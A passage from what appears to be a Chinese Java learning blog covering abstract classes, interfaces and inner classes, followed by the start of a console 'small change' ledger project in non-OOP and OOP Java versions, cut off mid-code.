id="抽象类的使用注意事项和细节">抽象类的使用注意事项和细节</h2><ol><li>抽象类不能被实例化</li><li>抽象类不一定要包含abstract方法。也就是说，抽象类可以没有abstract方法</li><li>一旦类包含了abstrat方法。则这个类必须声明为abstract</li><li>abstract只能修饰类和方法，不能修饰属性和其它的</li><li>抽象类可以有任意成员==抽象类的本质还是类==，比如：非抽象方法，构造器，静态方法等等</li><li>抽象方法不能有主体，即没有{}</li><li>如果一个类继承了抽象类，则它必须实现抽象类的所有抽象方法，除非它自己也声明为abstract类</li><li>抽象方法不能使用private,final和static来修饰，因为这些关键字都是和重写相违背的</li></ol><h1>模板设计模式</h1><h2 id="基本介绍-6">基本介绍</h2><blockquote><p>抽象类体现的就是一种模板模式的设计，抽象类作为子类的通用模板，子类在抽象类的基础上进行扩展，改造，但子类总体上会保留抽象类的行为方式</p></blockquote><h2 id="模板设计能解决的问题">模板设计能解决的问题</h2><ol><li>、当功能内部一部分是确定，一部分实现是不确定的。这时可以把不确定的部分暴露出去，让子类实现</li><li>编写一个抽象父类，父类提供了多个子类的通用方法，并把一个或多个方法留给子类实现，就是一种模板模式</li></ol><h1>接口</h1><h2 id="接口介绍">接口介绍</h2><blockquote><p>接口就是给出一些没有实现的方法，封装到一起，到某个类要使用的时候，在根据具体情况把这些方法说出来</p><p>语法</p><p>interface 接口名{</p><p>//属性</p><p>//抽象方法</p><p>}</p></blockquote><blockquote><p>class 类名 implements 接口{</p><p>自然属性;</p><p>自己方法;</p><p>必须实现的接口的抽象方法}</p></blockquote><p>接口是更加抽象的抽象的类， 抽象类的方法可以有方法体，接口里的所有方法都有没有方法体（相当于抽象类）</p><p>接口体现了程序设计的多态和高内聚低耦合的设计思想</p><p>jdk8后接口类可以有静态方法，默认方法，也就是说接口中可以有方法是具体实现</p><h2 id="接口事项和细节">接口事项和细节</h2><ol><li><p>接口不能被实例化</p></li><li><p>接口中所有的方法是public方法，接口中的抽象方法，可以不用abstract修饰</p><ul><li>void aa();</li><li>实际上是abstrast void aa();</li><li>==没有方法体==</li></ul></li><li><p>一个普通类实现接口，就必须将该接口的所有方法都实现</p></li><li><p>抽象类实现接口，可以不用实现接口的方法</p></li><li><p>一个类同时可以实现多个接口</p></li><li><p>接口中的属性，只能是final的，而且是 public static final 修饰符。比如: int a = 1；实际上是public static fianl int a = 1；（必须初始化）</p></li><li><p>接口中的属性的访问形式：接口名.属性名</p></li><li><p>接口不能继承其他的类，但是可以继承多个别的接口</p><p>interface A extends B,C{}</p></li><li><p>接口的修饰符 只能是 public 和 默认，这点和类的修饰符是一样的</p></li></ol><h2 id="接口和继承解决的问题不同">接口和继承解决的问题不同</h2><p>继承的价值主要在于：解决代码的复用性和可维护性</p><p>接口的价值主要在于：设计，设计各种规范（方法），让其他类去实现者这些方法，即更加灵活</p><blockquote><p>接口比继承更加灵活</p><p>接口比继承更加灵活，继承时满足is - a的关系，而接口只需要满足like -a的关系</p></blockquote><p>接口在一定程序上实现代码解耦【接口规范性+动态绑定机制】</p><h2 id="接口的多态特性">接口的多态特性</h2><ol><li><p>接口的引用可以指向实现了接口的类的对象</p></li><li><p>多态数组</p></li><li><p>接口存在多态传递的现象</p></li></ol><h1>内部类</h1><h2 id="内部类">内部类</h2><p>内部类有四种：</p><ul><li><p>如果定义类在局部位置（方法中/代码块）</p><ul><li>局部内部类</li><li>==匿名内部类==</li></ul></li><li><p>定义在成员的位置</p><ul><li>成员内部类</li><li>静态内部类</li></ul></li></ul><h2 id="内部类的基本介绍">内部类的基本介绍</h2><blockquote><p>一个类的内部又完整的嵌套了另一个类结构。被嵌套的类称为内部类（inner class）</p><p>嵌套其他类的类称为外部类（outer class）是我们类的第五大成员（属性，方法，构造器，代码块，内部类）</p><p>内部类最大的特点就是可以直接访问私有属性，并且可以体现类与类之间的包含关系，</p></blockquote><h2 id="基本语法-3">基本语法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Outer</span></span>&#123;<span class="comment">//外部类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Inner</span></span>&#123;<span class="comment">//内部类</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Other</span></span>&#123;<span class="comment">//外部其他类</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="内部类的分类">内部类的分类</h2><ul><li>定义在外部类的局部位置上（比如方法内）、</li></ul><ol><li>局部内部类（有类名）</li><li>匿名内部类（没有类名）</li></ol><ul><li>定义在外部类的成员位置上</li></ul><ol start="3"><li>成员内部类（没有static修饰）</li><li>静态内部类（使用static修饰）</li></ol><h2 id="局部内部类的使用">局部内部类的使用</h2><blockquote><p>局部内部类是定义在外部类的局部位置，比如方法中，并且有类名</p></blockquote><ol><li>可以直接访问外部类的所有成员，包含私有的</li><li>不能添加访问修饰符，因为它的地位就是一个局部变量。局部变量是不能使用修饰符的。但是可以使用final修饰，因为局部变量也可以使用final</li><li>作用域：仅仅在定义它的方法或代码块中</li><li>局部内部类–访问–&gt;外部类的成员【访问方式：直接访问】</li><li>外部类–访问—&gt;局部内部类的成员</li></ol><ul><li>访问方式：创建对象，再访问（注意：必须在作用域内）</li></ul><p>记住：</p><ol><li><p>局部内部类定义在方法中/代码块</p></li><li><p>作用域在方法体或者代码块中</p></li><li><p>本质仍然是一个类</p></li><li><p>外部其他类不能访问局部类（因为 局部内部类地位是一个局部变量）</p></li><li><p>如果外部类和局部类内部类的成员重名时，默认遵循就近原则，如果想访问外部类的成员，则可以使用（外部类名.this.成员）去访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="string">&quot;外部类的n2=&quot;</span>+外部类.<span class="keyword">this</span>.n2);</span><br></pre></td></tr></table></figure></li></ol><h2 id="匿名内部类的使用细节">匿名内部类的使用细节</h2><ul><li>本质还是类</li><li>内部类</li><li>该类没有名字</li><li>同时还是一个对象</li></ul><p>1.匿名内部类是定义在外部类的局部位置，不然方法中，并且没有类名</p><blockquote><ol><li><p>匿名内部类的基本语法</p><p>new 类或接口（参数列表）{</p><p>​类体</p><p>};</p></li></ol></blockquote><ol start="2"><li>匿名内部类的语法比较奇特，因为匿名内部类即是一个类的定义，同时它本身也是一个对象，因为从语法上看，它既有定义类的特征，也有创建对象特征，对前面代码分析可以看出这个特点，因为可以调头匿名内部类方法</li><li>可以直接访问外部类的所有成员，包含私有的</li><li>不能添加访问修饰符，因为它的地位就是一个局部变量</li><li>作用域：仅仅在定义它的方法或代码块</li><li>匿名内部类-访问-外部类成员</li><li>外部其他类-不能访问-匿名内部类（因为匿名内部地外是一个局部变量）</li><li>如果外部类和匿名内部类的成员重名时，匿名内部类访问的话。默认遵循就近原则，如果想访问外部类的成员，则可以使用（外部类.this.成员）去访问</li></ol><h2 id="成员内部类">成员内部类</h2><blockquote><p>成员内部类是定义在外部类的成员位置，并且没有static修饰</p></blockquote><ol><li><p>可以直接访问外部类的所有成员，包括私有的</p><ul><li><pre><code class="language-java">class XX&#123;//外部类private int n1 = 10;private String name = &quot;张三&quot;;class XXX&#123;public void say()&#123;System.out.println(&quot;XXX 的 n1 = &quot; + n1 + &quot; XXX 的 name =&quot; + name);&#125;&#125;&#125;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​2.可以添加任意访问修饰符(public,protected,默认,private)，因为成员内部类本质就是一个成员</span><br><span class="line"></span><br><span class="line">3. 作用域和和外部类的其他成员一样，为整个类体，比如在外部类成员方法中创建成员内部类对象，再调用方法</span><br><span class="line"></span><br><span class="line">4. 成员内部类访问外部类成员（比如属性）,访问方式是直接访问</span><br><span class="line"></span><br><span class="line">5. 外部类访问成员类成员（比如属性），访问方式也是直接访问</span><br><span class="line"></span><br><span class="line">6. 外部类访问成员内部类 访问方式是先创建对象，再访问</span><br><span class="line"></span><br><span class="line">7. 外部其他类访问成员内部类</span><br><span class="line"></span><br><span class="line">   + ```Java </span><br><span class="line">     /外部其他类，使用成员内部类的三种方式</span><br><span class="line">     // 第一种方式</span><br><span class="line">     // outer08.new Inner08(); 相当于把 new Inner08()当做是 outer08 成员</span><br><span class="line">     // 这就是一个语法，不要特别的纠结. Outer08.Inner08 inner08 = outer08.new Inner08();</span><br><span class="line">     inner08.say();</span><br><span class="line">     // 第二方式 在外部类中，编写一个方法，可以返回 Inner08 对象</span><br><span class="line">     Outer08.Inner08 inner08Instance = outer08.getInner08Instance();</span><br><span class="line">     inner08Instance.say();</span><br></pre></td></tr></table></figure></code></pre></li></ul></li><li><p>如果外部类和内部类的成员重名时，内部类访问的话，默认遵循就近原则，如果想访问外部类的成员，则可以使用（外部类名.this.成员）去访问</p></li></ol><h2 id="静态内部类的使用">静态内部类的使用</h2><blockquote><p>静态内部类是定义在外部类的成员位置，并且有static修饰</p></blockquote><ol><li><p>可以直接访问外部类的所以静态成员，包括私有的，但不能直接访问非静态成员</p></li><li><p>可以添加任意访问修饰符（public,protected,默认，private）因为本质上还是一个成员</p></li><li><p>作用域同其他成员一样，为整个类体</p></li><li><p>静态内部类访问外部类（比如静态属性），访问方式：直接访问所有静态成员</p></li><li><p>外部类访问静态内部类，访问方式：创建对象，再访问</p></li><li><p>外部其他类访问静态内部类</p></li><li><p>如果外部类和静态内部类的成员重名时，静态内部类访问的时，默认遵守就近原则，如果想访问外部类的成员，则可以使用（外部类名.成员）去访问</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>零钱通项目</title>
      <link href="//a872b2c2.html"/>
      <url>//a872b2c2.html</url>
      
        <content type="html"><![CDATA[<h1>零钱通项目</h1><h2 id="项目流程">项目流程</h2><blockquote><p>化繁为简</p><ol><li><p>先完成显示菜单，并可以选择菜单，给出对应的提示</p><ol start="2"><li>完成零钱通明细</li><li>收益入账</li><li>消费</li><li>退出</li><li>用户输入4退出时，给出提示“你确定要退出吗？ y/n”,必须输入正确的y/n</li><li>在收益入账和消费时，判断金额是否合理，并给出相应的提示</li></ol></li></ol></blockquote><h2 id="项目需求">项目需求</h2><p>使用 Java 开发 零钱通项目 , 可以完成收益入账，消费，查看明细，退出系统等功能</p><h2 id="项目界面">项目界面</h2><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220302235447669.png" alt="image-20220302235447669"></p><h2 id="项目代码实现">项目代码实现</h2><h3 id="非OOP版本">非OOP版本</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.thestar0.SmallChange;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Description（描述）:非OOP版的零钱通项目源码</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@DATe</span>&amp;TIME（创建时间）: 2022/3/1 - 19:27</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Project</span>_name（项目名）: opp2</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Package</span>_name（包名）: com.thestar0.SmallChange</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>（作者）: thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>（版本）: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SmaillChangeSys</span> </span>&#123;</span><br><span class="line">    <span class="comment">//化繁为简</span></span><br><span class="line">    <span class="comment">//1. 先完成显示菜单，并可以选择菜单，给出对应的提示</span></span><br><span class="line">    <span class="comment">//2. 完成零钱通明细</span></span><br><span class="line">    <span class="comment">//3. 收益入账</span></span><br><span class="line">    <span class="comment">//4. 消费</span></span><br><span class="line">    <span class="comment">//5. 退出</span></span><br><span class="line">    <span class="comment">//6. 用户输入4退出时，给出提示“你确定要退出吗？ y/n”,必须输入正确的y/n</span></span><br><span class="line">    <span class="comment">//7. 在收益入账和消费时，判断金额是否合理，并给出相应的提示</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//定义相关的变量</span></span><br><span class="line">        <span class="keyword">boolean</span> loop = <span class="keyword">true</span>;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String key = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">//2.完成零钱通明细</span></span><br><span class="line">        <span class="comment">//(1)可以把收益入账和消费，保存到数组</span></span><br><span class="line">        <span class="comment">//(2)可以使用对象</span></span><br><span class="line">        <span class="comment">//(3)简单的话可以使用String拼接</span></span><br><span class="line">        String detail = <span class="string">&quot;-----------零钱通明细-----------&quot;</span>;</span><br><span class="line">        <span class="comment">//3. 完成收益入账</span></span><br><span class="line">        <span class="keyword">double</span> money = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">double</span> balance = <span class="number">0</span>;</span><br><span class="line">        Date date = <span class="keyword">null</span>;<span class="comment">//date 是 java.util.Date类型，表示日期</span></span><br><span class="line">        SimpleDateFormat sdf = <span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd HH:mm&quot;</span>);<span class="comment">//用于日期格式化</span></span><br><span class="line">        <span class="comment">//4. 消费</span></span><br><span class="line">        <span class="comment">/*定义新变量，保存消费的原因*/</span></span><br><span class="line">        String note = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;<span class="comment">//do while做菜单</span></span><br><span class="line">            System.out.println(<span class="string">&quot;\n------------零钱通菜单-------------&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;\t\t\t1 零钱通明细&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;\t\t\t2 收益入账&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;\t\t\t3 消费&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;\t\t\t4 退     出&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;请选择（1~4）&quot;</span>);</span><br><span class="line">            key = scanner.next();</span><br><span class="line">            <span class="comment">//使用Swich分支控制</span></span><br><span class="line">            <span class="keyword">switch</span> (key) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;1&quot;</span>:</span><br><span class="line">                    System.out.println(detail);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;2&quot;</span>:</span><br><span class="line">                    System.out.println(<span class="string">&quot;收益入账金额：&quot;</span>);</span><br><span class="line">                    money = scanner.nextDouble();</span><br><span class="line">                    <span class="comment">/*找出不正确金额条件，然后给出提示，就直接break*/</span></span><br><span class="line">                    <span class="keyword">if</span> (money &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;收益入账金额 需要 大于 0&quot;</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    balance += money;</span><br><span class="line">                    date = <span class="keyword">new</span> Date();</span><br><span class="line">                    System.out.println(sdf.format(date));</span><br><span class="line">                    <span class="comment">//拼接收益入账到 details</span></span><br><span class="line">                    detail += <span class="string">&quot;\n收益入账\t&quot;</span> + money + <span class="string">&quot;\t&quot;</span> + sdf.format(date) + <span class="string">&quot;\t&quot;</span> + balance;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;3&quot;</span>:</span><br><span class="line">                    System.out.println(<span class="string">&quot;消费金额:&quot;</span>);</span><br><span class="line">                    money = scanner.nextDouble();</span><br><span class="line">                    <span class="keyword">if</span> (money &lt;= <span class="number">0</span> || money &gt; balance) &#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;你的消费金额应该在 0~&quot;</span> + balance);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    System.out.println(<span class="string">&quot;消费说明:&quot;</span>);</span><br><span class="line">                    note = scanner.next();</span><br><span class="line">                    balance -= money;</span><br><span class="line">                    detail += <span class="string">&quot;\n&quot;</span> + note + <span class="string">&quot;\t-&quot;</span> + money + <span class="string">&quot;\t&quot;</span> + sdf.format(date) + <span class="string">&quot;\t&quot;</span> + balance;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;4&quot;</span>:</span><br><span class="line">                    <span class="comment">/*用户输入4退出时，给出提示“你确定要退出吗？ y/n”,必须输入正确的y/n</span></span><br><span class="line"><span class="comment">                     * 否则循环输入指令，直到输入y 或者 n</span></span><br><span class="line"><span class="comment">                     * (1)先定义一个变量 choice，接受用户的输入</span></span><br><span class="line"><span class="comment">                     * (2)使用 while + break，来处理接受到的输入</span></span><br><span class="line"><span class="comment">                     * (3)退出 while后，再判断choice是y还是n ，就可以决定退出了 */</span></span><br><span class="line">                    String choice = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                        <span class="comment">/*要求用户必须输入y/n，否则就一直循环*/</span></span><br><span class="line">                        System.out.println(<span class="string">&quot;你确定要退出吗？ y/n&quot;</span>);</span><br><span class="line">                        choice = scanner.next();</span><br><span class="line">                        <span class="keyword">if</span> (<span class="string">&quot;y&quot;</span>.equals(choice) || <span class="string">&quot;n&quot;</span>.equals(choice)) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">/*当用户退出while,进行判断*/</span></span><br><span class="line">                    <span class="keyword">if</span> (choice.equals(<span class="string">&quot;y&quot;</span>)) &#123;</span><br><span class="line">                        loop = <span class="keyword">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    System.out.println(<span class="string">&quot;你的输入有误，请重新选择&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (loop);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;退出了零钱通系统&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="OOP版">OOP版</h3><blockquote><p>SmallChangeOOP类用于完成各项功能</p><ol><li>显示菜单，并可以选择</li><li>完成零钱通明细</li><li>完成收益入账</li><li>消费</li><li>退出</li></ol><p>SmalllChangeAPP类用于测试</p><p>main方法中创建SmallChangeOOP对象，调用相关方法，完成功能</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.thestar0.SmallChange.oop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Description（描述）:使用OOP面向对象编程完成零钱通项目功能</span></span><br><span class="line"><span class="comment"> * 将各个功能封装成方法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@DATe</span>&amp;TIME（创建时间）: 2022/3/2 - 23:50</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Project</span>_name（项目名）: opp2</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Package</span>_name（包名）: com.thestar0.SmallChange</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>（作者）: thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>（版本）: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SmallChangeSysOOP</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**属性*/</span></span><br><span class="line">    <span class="comment">//定义相关的变量</span></span><br><span class="line">    <span class="keyword">boolean</span> loop = <span class="keyword">true</span>;</span><br><span class="line">    Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">    String key = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">//2.完成零钱通明细</span></span><br><span class="line">    <span class="comment">//(1)可以把收益入账和消费，保存到数组</span></span><br><span class="line">    <span class="comment">//(2)可以使用对象</span></span><br><span class="line">    <span class="comment">//(3)简单的话可以使用String拼接</span></span><br><span class="line">    String detail = <span class="string">&quot;-----------零钱通明细-----------&quot;</span>;</span><br><span class="line">    <span class="comment">//3. 完成收益入账</span></span><br><span class="line">    <span class="keyword">double</span> money = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">double</span> balance = <span class="number">0</span>;</span><br><span class="line">    Date date = <span class="keyword">null</span>;<span class="comment">//date 是 java.util.Date类型，表示日期</span></span><br><span class="line">    SimpleDateFormat sdf = <span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd HH:mm&quot;</span>);<span class="comment">//用于日期格式化</span></span><br><span class="line">    <span class="comment">//4. 消费</span></span><br><span class="line">    <span class="comment">/*定义新变量，保存消费的原因*/</span></span><br><span class="line">    String note = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**完成零钱通菜单，并可以选择*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mainMenu</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;<span class="comment">//do while做菜单</span></span><br><span class="line">            System.out.println(<span class="string">&quot;\n------------选择零钱通菜单(OOP)-------------&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;\t\t\t1 零钱通明细&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;\t\t\t2 收益入账&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;\t\t\t3 消费&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;\t\t\t4 退     出&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;请选择（1~4）&quot;</span>);</span><br><span class="line">            key = scanner.next();</span><br><span class="line">            <span class="comment">//使用Swich分支控制</span></span><br><span class="line">            <span class="keyword">switch</span> (key) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;1&quot;</span>:</span><br><span class="line">                    <span class="keyword">this</span>.detail();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;2&quot;</span>:</span><br><span class="line">                   <span class="keyword">this</span>.income();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;3&quot;</span>:</span><br><span class="line">                    <span class="keyword">this</span>.pay();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;4&quot;</span>:</span><br><span class="line">                    <span class="keyword">this</span>.exit();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    System.out.println(<span class="string">&quot;你的输入有误，请重新选择&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (loop);</span><br><span class="line">    